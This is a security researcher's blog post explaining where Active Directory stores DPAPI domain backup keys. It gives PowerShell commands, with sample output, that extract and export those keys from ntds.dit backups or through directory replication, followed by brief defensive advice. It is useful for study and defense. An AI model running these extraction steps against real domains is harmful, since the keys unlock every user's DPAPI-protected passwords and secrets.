---
id: 6191
title: 'Retrieving DPAPI Backup Keys from&nbsp;Active Directory'
date: 2015-10-26T22:51:00+00:00
layout: post
lang: en
permalink: /en/retrieving-dpapi-backup-keys-from-active-directory/
---
<h3 style="text-align: justify;">
  Introduction
</h3>

<p style="text-align: justify;">
  The Data Protection API (DPAPI) is&nbsp;used by&nbsp;several components of&nbsp;Windows to securely store passwords, encryption keys and&nbsp;other sensitive data. When&nbsp;DPAPI is&nbsp;used in&nbsp;an Active Directory domain environment, a&nbsp;copy of&nbsp;user&#8217;s master key is&nbsp;encrypted with a&nbsp;so-called DPAPI Domain Backup Key that&nbsp;is&nbsp;known to&nbsp;all domain controllers. Windows Server 2000 DCs use a&nbsp;symmetric key and&nbsp;newer systems use a&nbsp;public/private key pair. If&nbsp;the&nbsp;user password is&nbsp;reset and&nbsp;the&nbsp;original master key is&nbsp;rendered inaccessible to&nbsp;the user, the&nbsp;user&#8217;s access to&nbsp;the master key is&nbsp;automatically restored using the&nbsp;backup key.
</p>

<h3 style="text-align: justify;">
  The&nbsp;Mimikatz Method
</h3>

<p style="text-align: justify;">
  Benjamin Delpy has already found a&nbsp;way to&nbsp;extract these backup keys from&nbsp;the&nbsp;LSASS of&nbsp;domain controllers and&nbsp;it even&nbsp;works remotely:
</p>

[<img class="aligncenter wp-image-6211 size-full" src="https://www.dsinternals.com/wp-content/uploads/mimikatz_backupkeys.png" alt="Mimikatz DPAPI Backup Keys" width="741" height="331" srcset="https://www.dsinternals.com/wp-content/uploads/mimikatz_backupkeys.png 741w, https://www.dsinternals.com/wp-content/uploads/mimikatz_backupkeys-300x134.png 300w" sizes="(max-width: 741px) 100vw, 741px" />](https://www.dsinternals.com/wp-content/uploads/mimikatz_backupkeys.png)

### Key Storage

<p style="text-align: justify;">
  I have taken Benjamin&#8217;s research one step further and&nbsp;I&nbsp;can now&nbsp;extract these keys directly from&nbsp;the&nbsp;Active Directory database, where&nbsp;they are physically stored:
</p>

[<img class="aligncenter wp-image-6231 size-full" src="https://www.dsinternals.com/wp-content/uploads/backupkeys_storage.png" alt="Backup Key Storage" width="643" height="254" srcset="https://www.dsinternals.com/wp-content/uploads/backupkeys_storage.png 643w, https://www.dsinternals.com/wp-content/uploads/backupkeys_storage-300x119.png 300w" sizes="(max-width: 643px) 100vw, 643px" />](https://www.dsinternals.com/wp-content/uploads/backupkeys_storage.png)

<p style="text-align: justify;">
  The&nbsp;keys are stored in&nbsp;the&nbsp;<strong>currentValue</strong> attribute of&nbsp;objects whose names begin with <strong>BCKUPKEY</strong> and&nbsp;are of&nbsp;class<strong> secret</strong>. The&nbsp;<strong>BCKUPKEY_PREFERRED Secret</strong> and&nbsp;<strong>BCKUPKEY_P Secret</strong> objects actually only contain GUIDs of&nbsp;objects that&nbsp;hold the&nbsp;current modern and&nbsp;legacy keys, respectively. Furthermore, the&nbsp;currentValue attribute is&nbsp;encrypted using BootKey (aka SysKey) and&nbsp;is&nbsp;never sent through LDAP.
</p>

<h3 style="text-align: justify;">
  The&nbsp;Database Dump Method
</h3>

<p style="text-align: justify;">
  The&nbsp;<strong>Get-BootKey</strong>, <strong>Get-ADDBBackupKey</strong> and&nbsp;<strong>Save-DPAPIBlob</strong> cmdlets from&nbsp;my <a href="https://www.dsinternals.com/en/downloads/">DSInternals PowerShell Module</a> can be used to&nbsp;retrieve the&nbsp;DPAPI Domain Backup Keys from&nbsp;ntds.dit files:
</p>

<pre class="lang:ps decode:true"># We need to&nbsp;get the&nbsp;BootKey from&nbsp;the&nbsp;SYSTEM registry hive first:
Get-BootKey -SystemHiveFilePath 'C:\IFM\registry\SYSTEM'

&lt;#
Output:

41e34661faa0d182182f6ddf0f0ca0d1

#&gt;

# Now&nbsp;we can decrypt the&nbsp;DPAPI backup keys from&nbsp;the&nbsp;database:
Get-ADDBBackupKey -DBPath 'C:\IFM\Active Directory\ntds.dit' `
                  -BootKey 41e34661faa0d182182f6ddf0f0ca0d1 |
    Format-List

&lt;#
Output:

Type&nbsp;: LegacyKey
DistinguishedName&nbsp;: CN=BCKUPKEY_7882b20e-96ef-4ce5-a2b9-3efdccbbce28 Secret,CN=System,DC=Adatum,DC=com
RawKeyData&nbsp;: {77, 138, 250, 6...}
KeyId&nbsp;: 7882b20e-96ef-4ce5-a2b9-3efdccbbce28

Type&nbsp;: PreferredLegacyKeyPointer
DistinguishedName&nbsp;: CN=BCKUPKEY_P Secret,CN=System,DC=Adatum,DC=com
RawKeyData&nbsp;: {14, 178, 130, 120...}
KeyId&nbsp;: 7882b20e-96ef-4ce5-a2b9-3efdccbbce28

Type&nbsp;: RSAKey
DistinguishedName&nbsp;: CN=BCKUPKEY_b1c56a3e-ddf7-41dd-a5f3-44a2ed27a96d Secret,CN=System,DC=Adatum,DC=com
RawKeyData&nbsp;: {48, 130, 9, 186...}
KeyId&nbsp;: b1c56a3e-ddf7-41dd-a5f3-44a2ed27a96d

Type&nbsp;: PreferredRSAKeyPointer
DistinguishedName&nbsp;: CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=Adatum,DC=com
RawKeyData&nbsp;: {62, 106, 197, 177...}
KeyId&nbsp;: b1c56a3e-ddf7-41dd-a5f3-44a2ed27a96d

#&gt;

# In&nbsp;most cases, we just want to&nbsp;export these keys to&nbsp;the file system:
Get-ADDBBackupKey -DBPath 'C:\IFM\Active Directory\ntds.dit' `
                  -BootKey 41e34661faa0d182182f6ddf0f0ca0d1 |
    Save-DPAPIBlob -DirectoryPath .\Keys

# New files should have been created in&nbsp;the&nbsp;Keys directory:

(dir .\Keys).Name

&lt;#
Output:

ntds_capi_b1c56a3e-ddf7-41dd-a5f3-44a2ed27a96d.pfx
ntds_legacy_7882b20e-96ef-4ce5-a2b9-3efdccbbce28.key

#&gt;</pre>

Note that&nbsp;mimikatz would name these files similarly.

### The&nbsp;DRSR Method

<p style="text-align: justify;">
  The&nbsp;same result can be achieved by&nbsp;communicating with the&nbsp;Directory Replication Service using the&nbsp;<strong>Get-ADReplBackupKey</strong> cmdlet:
</p>

<pre class="lang:ps decode:true">Get-ADReplBackupKey -Domain 'Adatum.com' -Server LON-DC1 |
    Save-DPAPIBlob -DirectoryPath .\Keys</pre>

### Defense

I&nbsp;am already starting to&nbsp;repeat myself:

<li style="text-align: justify;">
  Restrict access to&nbsp;domain controller backups.
</li>
<li style="text-align: justify;">
  Be cautious when&nbsp;delegating the&nbsp;&#8220;Replicating Directory Changes All&#8221; right.
</li>

&nbsp;